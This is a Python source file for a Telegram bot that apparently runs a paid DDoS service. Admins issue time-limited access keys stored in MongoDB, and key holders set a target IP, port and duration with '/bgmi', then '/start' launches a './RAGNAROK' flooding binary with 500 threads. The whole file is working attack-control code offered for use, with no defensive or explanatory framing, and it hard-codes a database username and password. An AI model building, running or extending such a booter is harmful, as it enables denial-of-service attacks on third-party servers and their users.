import subprocess
import random
import string
import datetime
from pymongo import MongoClient
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS

MONGO_URL = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DATABASE_NAME = "bot_db"
USERS_COLLECTION = "users"
KEYS_COLLECTION = "keys"

DEFAULT_THREADS = 500
flooding_process = None
flooding_command = None

client = MongoClient(MONGO_URL)
db = client[DATABASE_NAME]


def add_time_to_current_date(hours=0, days=0):
    return datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)


def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                db[KEYS_COLLECTION].insert_one({"key": key, "expires_at": expiration_date})
                response = f"**Key generated:** `{key}`\n**Expires on:** `{expiration_date}`"
            except ValueError:
                response = "**Invalid format! Use:** `/genkey <amount> <hours/days>`"
        else:
            response = "**Usage:** `/genkey <amount> <hours/days>`"
    else:
        response = "**ONLY OWNER CAN USE💀OWNER @DAKUBhaiZz**"

    await update.message.reply_text(response)


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        key_data = db[KEYS_COLLECTION].find_one({"key": key})
        if key_data:
            expiration_date = key_data['expires_at']
            user_data = db[USERS_COLLECTION].find_one({"user_id": user_id})
            if user_data:
                current_expiration = max(user_data['expires_at'], datetime.datetime.now())
                new_expiration_date = current_expiration + datetime.timedelta(hours=1)
                db[USERS_COLLECTION].update_one({"user_id": user_id}, {"$set": {"expires_at": new_expiration_date}})
            else:
                db[USERS_COLLECTION].insert_one({"user_id": user_id, "expires_at": expiration_date})
            db[KEYS_COLLECTION].delete_one({"key": key})
            response = f"✅ **Key redeemed successfully! Access granted until:** `{expiration_date}`"
        else:
            response = "**Invalid or expired key!**"
    else:
        response = "**Usage:** `/redeem <key>`"

    await update.message.reply_text(response)


async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        users = db[USERS_COLLECTION].find()
        if users.count() > 0:
            response = "**Authorized Users:**\n"
            for user in users:
                user_info = await context.bot.get_chat(int(user["user_id"]))
                username = user_info.username if user_info.username else f"UserID: {user['user_id']}"
                response += f"- @{username} (ID: {user['user_id']}) expires on `{user['expires_at']}`\n"
        else:
            response = "**No authorized users found.**"
    else:
        response = "**ONLY OWNER CAN USE.**"
    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)
    user_data = db[USERS_COLLECTION].find_one({"user_id": user_id})

    if not user_data or datetime.datetime.now() > user_data['expires_at']:
        await update.message.reply_text("❌ **Access expired or unauthorized. Please redeem a valid key.**")
        return

    if len(context.args) != 3:
        await update.message.reply_text('**Usage:** `/bgmi <target_ip> <port> <duration>`')
        return

    target_ip, port, duration = context.args
    flooding_command = ['./RAGNAROK', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f"**Flooding parameters set:** `{target_ip}:{port}` for `{duration}` seconds.")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)
    user_data = db[USERS_COLLECTION].find_one({"user_id": user_id})

    if not user_data or datetime.datetime.now() > user_data['expires_at']:
        await update.message.reply_text("❌ **Access expired or unauthorized. Please redeem a valid key.**")
        return

    if flooding_process is not None:
        await update.message.reply_text('❌ **Attack already running.**')
        return

    if flooding_command is None:
        await update.message.reply_text('**Set flooding parameters first using `/bgmi`.**')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('🚀 **Attack started...**')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)
    user_data = db[USERS_COLLECTION].find_one({"user_id": user_id})

    if not user_data or datetime.datetime.now() > user_data['expires_at']:
        await update.message.reply_text("❌ **Access expired or unauthorized. Please redeem a valid key.**")
        return

    if flooding_process is None:
        await update.message.reply_text('**No attack process running.**')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('✅ **Attack stopped.**')


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('**Usage:** `/broadcast <message>`')
            return

        users = db[USERS_COLLECTION].find()
        for user in users:
            try:
                await context.bot.send_message(chat_id=int(user["user_id"]), text=message)
            except Exception as e:
                print(f"Error sending message to {user['user_id']}: {e}")
        response = "**Message sent to all users.**"
    else:
        response = "**ONLY OWNER CAN USE.**"

    await update.message.reply_text(response)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        "**Flooding Bot Commands:**\n\n"
        "Admin Commands:\n"
        "/genkey <amount> <hours/days> - Generate a key.\n"
        "/allusers - List all authorized users.\n"
        "/broadcast <message> - Broadcast a message.\n\n"
        "User Commands:\n"
        "/redeem <key> - Redeem a key.\n"
        "/bgmi <target_ip> <port> <duration> - Set flooding parameters.\n"
        "/start - Start flooding.\n"
        "/stop - Stop flooding.\n"
    )
    await update.message.reply_text(response)


def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))

    application.run_polling()


if __name__ == '__main__':
    main()
